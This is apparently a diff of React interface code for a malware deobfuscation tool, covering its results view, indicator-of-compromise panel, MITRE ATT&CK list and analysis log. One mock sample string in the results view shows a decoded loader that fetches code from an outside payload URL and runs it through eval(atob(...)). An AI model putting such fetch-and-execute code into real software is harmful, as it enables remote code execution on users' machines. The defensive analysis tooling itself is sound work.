+                  {lc.inputKB} → {lc.outputKB} KB
+                  {lc.timeMs && <span style={{ color: C.textMuted, marginLeft:8 }}>{(lc.timeMs/1000).toFixed(1)}s</span>}
+                  {lc.entropy && <span style={{ color: C.textMuted, marginLeft:8 }}>H={lc.entropy}</span>}
+                </div>
+              </div>
+            ))}
+            <div style={{ background: C.bg2, border:`1px dashed ${C.border}`, borderRadius:3,
+              padding:'8px 10px', display:'flex', alignItems:'center', gap:7, opacity:.45 }}>
+              <div style={{ width:10, height:10, borderRadius:'50%', border:`1.5px solid ${C.textMuted}`,
+                borderTopColor:'transparent', animation:'spin .7s linear infinite' }} />
+              <span style={{ fontSize:11, fontFamily: C.mono, color: C.textMuted }}>detecting…</span>
+            </div>
+          </div>
+        </div>
+
+        {/* right: code */}
+        <div style={{ flex:1, display:'flex', flexDirection:'column', overflow:'hidden' }}>
+          <div style={{ padding:'5px 12px', background: C.bg2, borderBottom:`1px solid ${C.border}`,
+            display:'flex', alignItems:'center', gap:10, flexShrink:0 }}>
+            <span style={{ fontSize:11, color: C.textMuted, fontFamily: C.mono }}>layer</span>
+            <div style={{ display:'flex', border:`1px solid ${C.border2}`, borderRadius:3, overflow:'hidden' }}>
+              {[1,2,3].map(n => (
+                <button key={n} onClick={()=>setScrubber(n)}
+                  style={{ padding:'3px 11px', fontSize:11, fontFamily: C.mono, cursor:'pointer',
+                    background: scrubber===n ? lth.accentDim : 'transparent',
+                    color: scrubber===n ? lth.accentText : C.textDim,
+                    border:'none',
+                    borderRight: n<3 ? `1px solid ${C.border2}` : 'none' }}>
+                  L{n}
+                </button>
+              ))}
+            </div>
+            <span style={{ fontSize:10.5, fontFamily: C.mono, color: C.textMuted }}>
+              {scrubber===1 ? 'obfuscated' : scrubber===2 ? 'XOR decoded' : 'cleaned'}
+            </span>
+            <span style={{ marginLeft:'auto', fontSize:10.5, fontFamily: C.mono, color: C.textMuted,
+              display:'flex', alignItems:'center', gap:10 }}>
+              <span>{['51 234 B','42 158 B','28 154 B'][scrubber-1]}</span>
+              <span style={{ color: C.border2 }}>·</span>
+              <span>{['1 247','998','623'][scrubber-1]} lines</span>
+            </span>
+          </div>
+
+          <CodeViewer lines={OBFUSCATED_CODE.split('\n')} />
+        </div>
+      </div>
+
+      <LogStrip running lt={lth} />
+    </div>
+  );
+}
+
+// ─── IOC-highlighted code row ────────────────────────────────────────────────
+function IocRow({ isIoc, isAdd, isDel, ln, line, iocLabel }) {
+  const [hovered, setHovered] = React.useState(false);
+
+  const baseBg = isIoc
+    ? hovered ? 'rgba(212,95,95,.18)' : 'rgba(212,95,95,.07)'
+    : isAdd ? 'rgba(76,175,110,.08)'
+    : isDel ? 'rgba(212,95,95,.08)'
+    : 'transparent';
+
+  return (
+    <tr
+      onMouseEnter={() => setHovered(true)}
+      onMouseLeave={() => setHovered(false)}
+      style={{ background: baseBg, cursor: isIoc ? 'default' : undefined,
+        borderLeft: isIoc ? `2px solid ${hovered ? 'rgba(212,95,95,.7)' : 'rgba(212,95,95,.3)'}` : '2px solid transparent',
+        transition: 'background .1s, border-color .1s' }}>
+      <td style={{ width:14, verticalAlign:'top', paddingTop:3, paddingLeft:6, position:'relative' }}>
+      </td>
+      <td style={{ width:38, textAlign:'right', paddingRight:14,
+        color: isIoc ? (hovered ? '#9a5050' : '#606060') : '#606060',
+        userSelect:'none', fontSize:11, verticalAlign:'top', paddingLeft:0 }}>
+        {ln}
+      </td>
+      <td style={{ paddingRight:0, width:'100%' }}>
+        <code style={{
+          display:'block', paddingRight:20,
+          color: isDel ? '#9a4040' : isAdd ? '#4a8a5a' : colorize(line),
+          whiteSpace:'pre-wrap', wordBreak:'break-all' }}>
+          {line || ' '}
+        </code>
+      </td>
+    </tr>
+  );
+}
+
+// ─── results state ────────────────────────────────────────────────────────────
+function ResultsState({ iocOpen, setIocOpen, lang='js', lt }) {
+  const lth = lt || getLangTheme(lang);
+  const [tab, setTab] = useState('cleaned');
+
+  const codeMap = lang === 'py' ? {
+    cleaned:  PY_CLEAN_CODE,
+    original: PY_OBFUSCATED_CODE,
+    diff:     PY_CLEAN_CODE,
+    'layer-1': PY_OBFUSCATED_CODE,
+    'layer-2': PY_CLEAN_CODE,
+  } : {
+    cleaned:  CLEAN_CODE,
+    original: OBFUSCATED_CODE,
+    diff:     DIFF_CODE,
+    'layer-1': OBFUSCATED_CODE,
+    'layer-2': `// Layer 2 output — XOR strings decoded\nvar _decoded = [\n  'fetch',\n  'https://cdn-updates.net/payload/v2/init.php',\n  'response','text','localStorage','setItem','payload'\n];\n(function() {\n  fetch(_decoded[1])\n    .then(function(r) { return r[_decoded[3]](); })\n    .then(function(d) {\n      window[_decoded[4]][_decoded[5]](_decoded[6], d);\n      eval(atob(d));\n    });\n})();`,
+    report:   JSON.stringify({file:"malware_loader.js",sha256:"a3f2cc81...c8d1",duration_ms:16116,layers:3,ioc_count:9,severity:"high",obfuscators:["javascript-obfuscator","custom_xor_table","control_flow_flattening"],anti_analysis:["debugger_trap","self_defending_iife"]},null,2),
+  };
+
+  const tabs = [
+    { id:'cleaned',  label:'cleaned.js'   },
+    { id:'diff',     label:'diff'          },
+    { id:'layer-1',  label:'layer-1.js'   },
+    { id:'layer-2',  label:'layer-2.js'   },
+    { id:'original', label:'original.js'  },
+    { id:'report',   label:'report.json'  },
+  ];
+
+  const IOC_LINE_NUMS = [6, 7, 14, 17];
+  const codeLines = (codeMap[tab] || '').split('\n');
+
+  const iocByType = IOCS.reduce((acc, ioc) => {
+    if (!acc[ioc.type]) acc[ioc.type] = [];
+    acc[ioc.type].push(ioc);
+    return acc;
+  }, {});
+
+  return (
+    <div style={{ flex:1, display:'flex', flexDirection:'column', overflow:'hidden' }}>
+      <FileStrip status="done" onIocToggle={() => setIocOpen(!iocOpen)} iocOpen={iocOpen} lang={lang} lt={lth} />
+
+      <div style={{ flex:1, display:'flex', overflow:'hidden' }}>
+        {/* code pane */}
+        <div style={{ flex:1, display:'flex', flexDirection:'column', overflow:'hidden' }}>
+          {/* tabs */}
+          <div style={{ display:'flex', background: C.bg2, borderBottom:`1px solid ${C.border}`,
+            overflowX:'auto', flexShrink:0 }}>
+            {tabs.map(t => (
+              <button key={t.id} className="tab-btn"
+                onClick={() => setTab(t.id)}
+                style={{ padding:'7px 14px', background: tab===t.id ? C.bg : 'none',
+                  border:'none', borderBottom: tab===t.id ? `2px solid ${lth.accent}` : '2px solid transparent',
+                  cursor:'pointer', fontSize:11.5, fontFamily: C.mono,
+                  color: tab===t.id ? '#e0e0e0' : '#606060',
+                  whiteSpace:'nowrap', flexShrink:0, marginBottom:-1, transition:'color .1s' }}>
+                {t.label}
+              </button>
+            ))}
+            <div style={{ flex:1 }} />
+            <div style={{ display:'flex', alignItems:'center', gap:5, paddingRight:10 }}>
+              <button className="btn-hover" style={{ padding:'3px 9px', background: C.bg3,
+                border:`1px solid ${C.border2}`, borderRadius:3, fontSize:11,
+                color: C.textDim, cursor:'pointer', fontFamily: C.mono }}>
+                copy
+              </button>
+              <button className="btn-hover" style={{ padding:'3px 9px', background: C.bg3,
+                border:`1px solid ${C.border2}`, borderRadius:3, fontSize:11,
+                color: C.textDim, cursor:'pointer', fontFamily: C.mono }}>
+                save
+              </button>
+            </div>
+          </div>
+
+          {/* editor */}
+          <div style={{ flex:1, overflowY:'auto', background:'#0a0a0a', position:'relative' }}>
+            <table style={{ borderCollapse:'collapse', width:'100%',
+              fontFamily: C.mono, fontSize:12, lineHeight:1.7 }}>
+              <tbody>
+                {codeLines.map((line, i) => {
+                  const ln = i + 1;
+                  const isIoc  = tab==='cleaned' && IOC_LINE_NUMS.includes(ln);
+                  const isAdd  = tab==='diff' && line.trimStart().startsWith('+');
+                  const isDel  = tab==='diff' && line.trimStart().startsWith('-');
+                  // find matching IOC value for tooltip
+                  const iocMatch = isIoc && IOCS.find(ioc => line.includes(ioc.value.slice(0,20)));
+                  const iocLabel = iocMatch ? `IOC · ${iocMatch.type} · ${iocMatch.sev.toUpperCase()}: ${iocMatch.value}` : 'IOC indicator — see IOC panel';
+                  return (
+                    <IocRow key={i}
+                      isIoc={isIoc} isAdd={isAdd} isDel={isDel}
+                      ln={ln} line={line} iocLabel={iocLabel} />
+                  );
+                })}
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        {/* IOC panel */}
+        {iocOpen && (
+          <div style={{ width:290, borderLeft:`1px solid ${C.border}`, background: C.bg1,
+            display:'flex', flexDirection:'column', overflow:'hidden', flexShrink:0 }}>
+            <div style={{ padding:'8px 12px', borderBottom:`1px solid ${C.border}`,
+              display:'flex', alignItems:'center', justifyContent:'space-between' }}>
+              <span style={{ fontSize:11, fontWeight:600, color: C.text,
+                textTransform:'uppercase', letterSpacing:'.06em' }}>IOC</span>
+              <div style={{ display:'flex', gap:5 }}>
+                <Tag sev="high" small>4×HIGH</Tag>
+                <Tag sev="med" small>2×MED</Tag>
+                <Tag sev="low" small>3×LOW</Tag>
+              </div>
+            </div>
+
+            <div style={{ flex:1, overflowY:'auto' }}>
+              {Object.entries(iocByType).map(([type, items]) => (
+                <div key={type} style={{ borderBottom:`1px solid ${C.border}` }}>
+                  <div style={{ padding:'7px 12px 4px',
+                    fontSize:10, fontWeight:600, color: C.textMuted,
+                    textTransform:'uppercase', letterSpacing:'.1em', fontFamily: C.mono }}>
+                    {type} ({items.length})
+                  </div>
+                  {items.map((ioc, j) => (
+                    <div key={j} className="ioc-row"
+                      style={{ padding:'5px 12px', cursor:'pointer' }}>
+                      <div style={{ display:'flex', alignItems:'flex-start', justifyContent:'space-between', gap:8 }}>
+                        <code style={{ fontSize:10.5, color: C.textDim, fontFamily: C.mono,
+                          wordBreak:'break-all', flex:1, lineHeight:1.5 }}>
+                          {ioc.value}
+                        </code>
+                        <Tag sev={ioc.sev} small>{ioc.sev}</Tag>
+                      </div>
+                      <div style={{ display:'flex', gap:4, marginTop:5 }}>
+                        {['VT','URLhaus','Copy'].map(a=>(
+                          <button key={a} className="btn-hover"
+                            style={{ fontSize:10, padding:'1px 7px', borderRadius:2,
+                              background: C.bg3, border:`1px solid ${C.border}`,
+                              cursor:'pointer', color: C.textDim, fontFamily: C.mono }}>
+                            {a}
+                          </button>
+                        ))}
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              ))}
+
+              {/* MITRE */}
+              <div style={{ borderBottom:`1px solid ${C.border}` }}>
+                <div style={{ padding:'7px 12px 4px', fontSize:10, fontWeight:600,
+                  color: C.textMuted, textTransform:'uppercase', letterSpacing:'.1em', fontFamily: C.mono }}>
+                  MITRE ATT&amp;CK
+                </div>
+                {MITRE.map(m => (
+                  <div key={m.id} className="ioc-row" style={{ padding:'5px 12px', cursor:'pointer' }}>
+                    <div style={{ display:'flex', gap:8, alignItems:'baseline' }}>
+                      <code style={{ fontSize:10.5, color: lth.accentText, fontFamily: C.mono, flexShrink:0 }}>
+                        {m.id}
+                      </code>
+                      <span style={{ fontSize:11, color: '#909090', lineHeight:1.5 }}>{m.name}</span>
+                    </div>
+                    <div style={{ fontSize:10, color: C.textMuted, paddingLeft:56, fontFamily: C.mono }}>
+                      {m.tac}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            {/* export row */}
+            <div style={{ padding:'8px 10px', borderTop:`1px solid ${C.border}`,
+              display:'flex', gap:5 }}>
+              {['Export PDF','Export JSON','CyberChef →'].map(label => (
+                <button key={label} className="btn-hover"
+                  style={{ flex:1, padding:'5px 4px', background: C.bg3,
+                    border:`1px solid ${C.border}`, borderRadius:2, fontSize:10.5,
+                    cursor:'pointer', color: C.textDim, fontFamily:'Geist, sans-serif' }}>
+                  {label}
+                </button>
+              ))}
+            </div>
+          </div>
+        )}
+      </div>
+
+      <LogStrip done lt={lth} />
+    </div>
+  );
+}
+
+// ─── shared: file strip ───────────────────────────────────────────────────────
+function FileStrip({ status, onIocToggle, iocOpen, lang='js', lt }) {
+  const lth = lt || getLangTheme(lang);
+  const fileName   = lang === 'py' ? 'stage2_dropper.py' : 'malware_loader.js';
+  const obfChip    = lth.obfChip;
+  const obfColor   = lth.accentText;
+  const obfBg      = lth.accentDim;
+  const obfBorder  = lth.accent + '55';
+  return (
+    <div style={{ height:38, background: C.bg2, borderBottom:`1px solid ${C.border}`,
+      display:'flex', alignItems:'center', padding:'0 12px', gap:10, flexShrink:0 }}>
+      <div style={{ display:'flex', alignItems:'center', gap:6,
+        background: C.bg3, border:`1px solid ${C.border2}`,
+        padding:'3px 10px', borderRadius:3 }}>
+        {status === 'running'
+          ? <div style={{ width:7, height:7, borderRadius:'50%',
+              background: C.red, animation:'pulse 1.2s ease-in-out infinite' }} />
+          : <div style={{ width:7, height:7, borderRadius:'50%', background: C.teal }} />}
+        <span style={{ fontFamily: C.mono, fontSize:12, color: C.text, whiteSpace:'nowrap' }}>
+          {fileName}
+        </span>
+        <span style={{ fontSize:11, color: C.textMuted }}>51.2 KB</span>
+        <span style={{ fontFamily: C.mono, fontSize:10,
+          color: obfColor, padding:'1px 6px',
+          background: obfBg, border:`1px solid ${obfBorder}`, whiteSpace:'nowrap', flexShrink:0, borderRadius:2 }}>
+          {obfChip}
+        </span>
+      </div>
+
+      {status === 'done' && (
+        <>
+          <span style={{ color: C.textMuted, fontSize:12 }}>→</span>
+          <span style={{ fontFamily: C.mono, fontSize:11, color: C.green }}>12.7 KB</span>
+          <span style={{ fontFamily: C.mono, fontSize:10, color: C.textDim,
+            background: C.tealDim, border:`1px solid ${C.teal}`,
+            padding:'1px 6px', borderRadius:2 }}>3 layers · 16.1s</span>
+          <div style={{ flex:1 }} />
+          <div style={{ display:'flex', gap:5 }}>
+            <Tag sev="high">4 HIGH</Tag>
+            <Tag sev="med">2 MED</Tag>
+            <Tag sev="low">3 LOW</Tag>
+          </div>
+          <button onClick={onIocToggle} className="btn-hover"
+            style={{ padding:'3px 11px', background: iocOpen ? lth.accentDim : C.bg3,
+              border:`1px solid ${iocOpen ? lth.accent : C.border2}`, borderRadius:2,
+              fontSize:11.5, color: iocOpen ? lth.accentText : C.textDim,
+              cursor:'pointer', fontFamily: C.mono, display:'flex', alignItems:'center', gap:5 }}>
+            <span style={{ fontSize:13 }}>{iocOpen ? '✕' : '☰'}</span>
+            <span>IOC</span>
+          </button>
+        </>
+      )}
+
+      {status === 'running' && (
+        <>
+          <div style={{ flex:1 }} />
+          <div style={{ display:'flex', alignItems:'center', gap:8 }}>
+            <div style={{ width:11, height:11, borderRadius:'50%',
+              border:`1.5px solid ${lth.accent}`, borderTopColor:'transparent',
+              animation:'spin .7s linear infinite' }} />
+            <span style={{ fontSize:11, fontFamily: C.mono, color: lth.accentText }}>
+              layer 3/3 · CFG flattening
+            </span>
+            <span style={{ fontSize:10.5, fontFamily: C.mono, color: C.textMuted }}>
+              eta ~6s
+            </span>
+          </div>
+          <button className="btn-hover" style={{ padding:'3px 10px', background: C.bg3,
+            border:`1px solid ${C.border2}`, borderRadius:2,
+            fontSize:11, color: C.textDim, cursor:'pointer', fontFamily: C.mono }}>
+            cancel
+          </button>
+        </>
+      )}
+    </div>
+  );
+}
+
+// ─── shared: code viewer ──────────────────────────────────────────────────────
+function CodeViewer({ lines }) {
+  return (
+    <div style={{ flex:1, overflowY:'auto', background:'#0a0a0a' }}>
+      <table style={{ borderCollapse:'collapse', width:'100%',
+        fontFamily: C.mono, fontSize:12, lineHeight:1.7 }}>
+        <tbody>
+          {lines.map((line, i) => (
+            <tr key={i} className="row-hover">
+              <td style={{ width:40, textAlign:'right', paddingRight:14, color:'#333',
+                userSelect:'none', fontSize:11, verticalAlign:'top', paddingLeft:14 }}>
+                {i+1}
+              </td>
+              <td style={{ paddingRight:16 }}>
+                <code style={{ color: colorize(line), whiteSpace:'pre-wrap', wordBreak:'break-all' }}>
+                  {line || ' '}
+                </code>
+              </td>
+            </tr>
+          ))}
+        </tbody>
+      </table>
+    </div>
+  );
+}
+
+// ─── shared: log strip ────────────────────────────────────────────────────────
+const LOG_ENTRIES = [
+  { t:'11:54:59.657', level:'INFO',  indent:0, text:'──────────────── Layer 1/3 ────────────────────' },
+  { t:'11:54:59.659', level:'DEBUG', indent:1, text:'Pattern detection: scanning 51 234 bytes' },
+  { t:'11:54:59.660', level:'DEBUG', indent:2, text:'javascript_obfuscator: 97% (8/8 patterns)' },
+  { t:'11:54:59.663', level:'DEBUG', indent:2, text:'string_array_rotation: 83% (1/2 patterns)' },
+  { t:'11:54:59.667', level:'DEBUG', indent:2, text:'Source entropy: 5.82 (threshold: 5.5)' },
+  { t:'11:54:59.669', level:'INFO',  indent:1, text:'Detected: javascript_obfuscator (97%)' },
+  { t:'11:54:59.672', level:'DEBUG', indent:1, text:'Phase: Dynamic analysis — eval triggers found' },
+  { t:'11:54:59.674', level:'DEBUG', indent:2, text:'anti-analysis: debugger_trap neutralised' },
+  { t:'11:54:59.675', level:'DEBUG', indent:2, text:'anti-analysis: self_defending_iife removed' },
+  { t:'11:54:59.754', level:'DEBUG', indent:2, text:'↳ Beautifier: 68 420 bytes' },
+  { t:'11:54:59.757', level:'DEBUG', indent:2, text:'↳ Hex/Unicode String Decoder: 61 830 bytes (-6 590)' },
+  { t:'11:55:00.001', level:'DEBUG', indent:2, text:'Dynamic string table: 123 entries resolved' },
+  { t:'11:55:00.028', level:'DEBUG', indent:2, text:'Accessor proxy functions: b, e, k, I, T, x, P, U, p, y…' },
+  { t:'11:55:00.095', level:'DEBUG', indent:2, text:'Pre-pass stringArrayDecoder: 200 change(s)' },
+  { t:'11:55:00.664', level:'DEBUG', indent:2, text:'AST pass 1: 1931 changes' },
+  { t:'11:55:00.912', level:'DEBUG', indent:2, text:'AST pass 2: 15 changes' },
+  { t:'11:55:01.184', level:'DEBUG', indent:2, text:'AST pass 3: 13 changes' },
+  { t:'11:55:01.579', level:'DEBUG', indent:2, text:'AST pass 5: 12 changes' },
+  { t:'11:55:01.753', level:'DEBUG', indent:2, text:'AST pass 6: 4 changes' },
+  { t:'11:55:01.960', level:'DEBUG', indent:2, text:'AST pass 7: 0 changes — converged' },
+  { t:'11:55:01.968', level:'DEBUG', indent:2, text:'↳ AST Simplification Pipeline: 28 110 bytes (-23 124)' },
+  { t:'11:55:01.970', level:'OK',    indent:1, text:'Static analysis: 28 110 bytes  (−45.1%)  4.31s' },
+  { t:'11:55:01.971', level:'INFO',  indent:0, text:'──────────────── Layer 2/3 ────────────────────' },
+  { t:'11:55:01.974', level:'DEBUG', indent:1, text:'Pattern detection: scanning 28 110 bytes' },
+  { t:'11:55:01.974', level:'DEBUG', indent:2, text:'Source entropy: 4.41 (threshold: 5.5)' },
+  { t:'11:55:01.975', level:'INFO',  indent:1, text:'Detected: custom XOR string table (key=0x4A)' },
+  { t:'11:55:01.977', level:'DEBUG', indent:2, text:'↳ Hex/Unicode String Decoder: not applicable' },
+  { t:'11:55:02.141', level:'DEBUG', indent:2, text:'AST pass 1: 1 changes' },
+  { t:'11:55:02.295', level:'DEBUG', indent:2, text:'AST pass 2: 13 changes' },
+  { t:'11:55:02.635', level:'DEBUG', indent:2, text:'AST pass 5: 2 changes' },
+  { t:'11:55:02.870', level:'DEBUG', indent:2, text:'AST pass 6: 0 changes — converged' },
+  { t:'11:55:02.874', level:'DEBUG', indent:2, text:'↳ AST Simplification Pipeline: 19 300 bytes (-8 810)' },
+  { t:'11:55:02.875', level:'OK',    indent:1, text:'Static analysis: 19 300 bytes  (−31.3%)  1.84s' },
+  { t:'11:55:02.876', level:'INFO',  indent:0, text:'──────────────── Layer 3/3 ────────────────────' },
+  { t:'11:55:02.879', level:'DEBUG', indent:1, text:'Pattern detection: scanning 19 300 bytes' },
+  { t:'11:55:02.880', level:'INFO',  indent:1, text:'Detected: control-flow flattening' },
+  { t:'11:55:03.072', level:'DEBUG', indent:2, text:'AST pass 1: 0 changes — converged' },
+  { t:'11:55:03.074', level:'DEBUG', indent:2, text:'↳ AST Simplification Pipeline: 12 700 bytes (-6 600)' },
+  { t:'11:55:03.075', level:'INFO',  indent:1, text:'Nothing more to extract — stopping.' },
+  { t:'11:55:03.090', level:'DEBUG', indent:1, text:'LLM config: provider=openai, model=gpt-4o' },
+  { t:'11:55:49.098', level:'OK',    indent:1, text:'↳ LLM rename applied  (46s)' },
+  { t:'11:55:54.121', level:'OK',    indent:1, text:'↳ Code formatted via LLM  (5s)' },
+  { t:'11:55:54.124', level:'INFO',  indent:1, text:'Extracting IOCs…' },
+  { t:'11:55:54.130', level:'OK',    indent:0, text:'Done. Processed 3 layer(s). 51 234 → 12 700 bytes  (−75.2%)  16.1s' },
+];
+
+function LogStrip({ running, done, lt }) {
+  const lth = lt || getLangTheme(null);
+  const [open, setOpen] = useState(true);
+  const [filter, setFilter] = useState('all'); // all | info | debug | ok
+  const logRef = useRef(null);
+
+  const levelColor = { DEBUG: '#555555', INFO: '#5a8fd4', OK: '#e0e0e0', WARN: C.orange, ERR: C.red };
+  const entryColor = (e) => {
+    if (e.level === 'OK')   return '#ffffff';
+    if (e.level === 'INFO') return '#7aaee8';
+    if (e.level === 'ERR')  return C.red;
+    if (e.level === 'WARN') return C.orange;
+    if (/\d+%/.test(e.text)) return C.orange;
+    if (e.text.startsWith('↳')) return '#8aaecc';
+    if (/not applicable/.test(e.text)) return '#353535';
+    if (/converged|no changes/.test(e.text)) return '#484848';
+    return '#909090';
+  };
+
+  const visible = filter === 'all'
+    ? LOG_ENTRIES
+    : LOG_ENTRIES.filter(e => e.level === filter.toUpperCase());
+
+  useEffect(() => {
+    if (open && logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight;
+  }, [open]);
+
+  const isLayerHeader = e => e.text.startsWith('──');
+  const isDone = e => e.level === 'OK' && e.indent === 0;
+
+  return (
+    <div style={{ borderTop:`1px solid ${C.border}`, background: C.bg1, flexShrink:0 }}>
+      {/* header bar */}
+      <div style={{ display:'flex', alignItems:'center', borderBottom: open ? `1px solid ${C.border}` : 'none' }}>
+        <button onClick={()=>setOpen(!open)} className="btn-hover"
+          style={{ background:'none', border:'none', cursor:'pointer',
+            padding:'5px 10px 5px 12px', display:'flex', alignItems:'center', gap:7 }}>
+          <Ico d={open ? "M4 10l4-4 4 4" : "M4 6l4 4 4-4"} col={C.textMuted} />
+          <span style={{ fontFamily: C.mono, fontSize:11, color: C.textMuted }}>log</span>
+        </button>
+        <span style={{ fontFamily: C.mono, fontSize:10, padding:'0 5px', borderRadius:2,
+          background: C.bg3, border:`1px solid ${C.border}`, color: C.textMuted }}>
+          {LOG_ENTRIES.length} lines
+        </span>
+        {running && (
+          <span style={{ fontFamily: C.mono, fontSize:10, color: lth.accentText, marginLeft:8,
+            animation:'pulse 1.2s ease-in-out infinite' }}>● running</span>
+        )}
+        {done && (
+          <span style={{ fontFamily: C.mono, fontSize:10, color: C.teal, marginLeft:8 }}>
+            ✓ done · 16.1s
+          </span>
+        )}
+        {open && (
+          <div style={{ display:'flex', gap:2, marginLeft:'auto', paddingRight:10 }}>
+            {['all','info','ok','debug'].map(f => (
+              <button key={f} onClick={()=>setFilter(f)} className="btn-hover"
+                style={{ padding:'2px 7px', borderRadius:2, fontSize:10, fontFamily: C.mono,
+                  background: filter===f ? C.bg4 : 'none',
+                  border: `1px solid ${filter===f ? C.border2 : 'transparent'}`,
+                  color: filter===f
+                    ? (f==='ok' ? C.teal : f==='info' ? '#6b7a9b' : f==='debug' ? '#4a5a4a' : C.textDim)
+                    : C.textMuted,
+                  cursor:'pointer' }}>
+                {f}
+              </button>
+            ))}
+          </div>
+        )}
+      </div>
+
+      {open && (
+        <div ref={logRef}
+          style={{ background:'#080808', maxHeight:180, overflowY:'auto',
+            fontFamily: C.mono, fontSize:11, lineHeight:1.6 }}>
+          {visible.map((e, i) => {
+            const col = levelColor[e.level] || '#484843';
+            const header = isLayerHeader(e);
+            const okDone = isDone(e);
+            return (
+              <div key={i} style={{
+                display:'flex', gap:0, padding: header ? '4px 0 2px' : '0',
+                background: okDone ? 'rgba(78,201,176,.05)' : header ? 'rgba(255,255,255,.02)' : 'transparent',
+                borderTop: header ? `1px solid ${C.border}` : 'none',
+              }}>
+                {/* timestamp */}
+                <span style={{ color:'#303030', paddingLeft:12, paddingRight:8,
+                  userSelect:'none', flexShrink:0, fontSize:10 }}>
+                  {e.t}
+                </span>
+                {/* level badge */}
+                <span style={{ width:38, flexShrink:0, textAlign:'right', paddingRight:8,
+                  color: col, fontSize:10, fontWeight: e.level==='OK' ? 600 : 400 }}>
+                  {e.level}
+                </span>
+                {/* indent + text */}
+                <span style={{
+                  color: header ? '#3a3a4a' : entryColor(e),
+                  paddingLeft: e.indent * 12,
+                  fontWeight: header || okDone ? 500 : 400,
+                  flex:1, paddingRight:14 }}>
+                  {e.text}
+                </span>
+              </div>
+            );
+          })}
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── footer ───────────────────────────────────────────────────────────────────
+function Footer({ view, lt }) {
+  const lth = lt || getLangTheme(null);
+  const cliCmd = 'npx ts-node src/main.ts malware_loader.js --use-llm --verbose';
+  const [copied, setCopied] = React.useState(false);
+
+  function copy() {
+    navigator.clipboard?.writeText(cliCmd).catch(()=>{});
+    setCopied(true);
+    setTimeout(() => setCopied(false), 1800);
+  }
+
+  return (
+    <div style={{ background: C.bg1, borderTop:`1px solid ${C.border}`, flexShrink:0 }}>
+
+      {/* status row */}
+      <div style={{ height:26, display:'flex', alignItems:'center',
+        padding:'0 14px', gap:0 }}>
+        <span style={{ fontSize:10.5, fontFamily: C.mono, color: C.accentText }}>
+          jsdeobf v0.9.4-dev
+        </span>
+        <span style={{ color: C.border2, margin:'0 10px' }}>·</span>
+        <span style={{ fontSize:10.5, color: C.textMuted, fontFamily: C.mono }}>
+          {view === 'empty' ? 'ready' : view === 'analyzing' ? '● running' : '✓ done'}
+        </span>
+        <div style={{ flex:1 }} />
+        <div style={{ display:'flex', gap:12, alignItems:'center' }}>
+          <span style={{ fontSize:10.5, fontFamily: C.mono, color: C.textDim }}>
+            mem <span style={{color: C.textMuted}}>184MB</span>
+          </span>
+          <span style={{ color: C.border2 }}>·</span>
+          <span style={{ fontSize:10.5, fontFamily: C.mono, color: C.textDim }}>
+            workers <span style={{color: C.textMuted}}>4</span>
+          </span>
+          <span style={{ color: C.border2 }}>·</span>
+          <span style={{ fontSize:10.5, fontFamily: C.mono, color: C.textDim }}>
+            vm sandbox
+          </span>
+          <span style={{ color: C.border2 }}>·</span>
+          <span style={{ fontSize:10.5, fontFamily: C.mono, color: C.textMuted }}>
+            UTF-8
+          </span>
+          <span style={{ color: C.border2 }}>·</span>
+          <span style={{ fontSize:10.5, fontFamily: C.mono, color: C.textMuted,
+            display:'flex', alignItems:'center', gap:5 }}>
+            <span style={{ width:6, height:6, borderRadius:'50%', background:'#4caf6e' }} />
+            samples stay local
+          </span>
+          <span style={{ color: C.border2, margin:'0 2px' }}>·</span>
+          <a href="#" style={{ fontSize:10.5, fontFamily: C.mono, color: C.textMuted,
+            textDecoration:'none' }}>
+            GitHub
+          </a>
+          <a href="#" style={{ fontSize:10.5, fontFamily: C.mono, color: C.textMuted,
+            textDecoration:'none' }}>
+            Docs
+          </a>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── syntax coloriser ─────────────────────────────────────────────────────────
+function colorize(line) {
+  // syntax highlighting recognises both JS and Python keywords (no theming)
+  const isPyComment = line.trimStart().startsWith('#') && !line.includes('://');
+  if (isPyComment || line.trimStart().startsWith('//')) return '#7ab568';
+  if (/⚠/.test(line)) return '#d46a6a';
+  if (/\b(async|await|function|return|const|let|var|if|else|new|this|typeof|def|import|from|class|lambda|None|True|False|self|elif|try|except|with|raise|yield|in|not|and|or|pass)\b/.test(line)) return '#8ab8d8';
+  if (/'[^']*'|"[^"]*"|`[^`]*`/.test(line)) return '#cc9e78';
+  if (/0x[0-9a-fA-F]+/.test(line)) return '#aabe8a';
+  return '#c8c8c0';
+}
+
+// ─── app root ─────────────────────────────────────────────────────────────────
+function App() {
+  const { TweaksPanel, TweakSection, TweakRadio, TweakToggle, useTweaks } = window;
+
+  const [tweaks, setTweak] = useTweaks(/*EDITMODE-BEGIN*/{
+    "view": "results",
+    "sidebarCollapsed": true,
+    "iocOpen": true,
+    "lang": "py"
+  }/*EDITMODE-END*/);
+
+  const { view, sidebarCollapsed, iocOpen, lang } = tweaks;
+  // lt = null on upload (lang unknown), set after detection
+  const lt = view === 'empty' ? getLangTheme(null) : getLangTheme(lang);
+  if (typeof window !== 'undefined') { window.__lth = lt; window.__lang = view==='empty' ? null : lang; }
+  const [activeSession, setActiveSession] = useState(1);
+
+  return (
+    <div style={{ display:'flex', flexDirection:'column', height:'100%', overflow:'hidden',
+      background: C.bg }}>
+      <Header view={view} onNewAnalysis={() => setTweak('view','empty')} lt={lt} />
+      <div style={{ flex:1, display:'flex', overflow:'hidden' }}>
+        <Sidebar
+          collapsed={sidebarCollapsed}
+          onToggle={() => setTweak('sidebarCollapsed', !sidebarCollapsed)}
+          activeSession={activeSession}
+          setActiveSession={setActiveSession}
+          lang={lang}
+          lt={lt}
+        />
+        <div style={{ flex:1, display:'flex', overflow:'hidden' }}>
+          {view === 'empty'     && <EmptyState lang={lang} />}
+          {view === 'analyzing' && <AnalyzingState lang={lang} lt={lt} />}
+          {view === 'results'   && <ResultsState iocOpen={iocOpen} setIocOpen={v=>setTweak('iocOpen',v)} lang={lang} lt={lt} />}
+        </div>
+      </div>
+      <Footer view={view} lt={lt} />
+
+      <TweaksPanel>
+        <TweakSection label="View">
+          <TweakRadio id="view" label="Screen" value={view}
+            options={[
+              {value:'empty',     label:'Upload'},
+              {value:'analyzing', label:'Analyzing'},
+              {value:'results',   label:'Results'},
+            ]}
+            onChange={v=>setTweak('view',v)} />
+        </TweakSection>
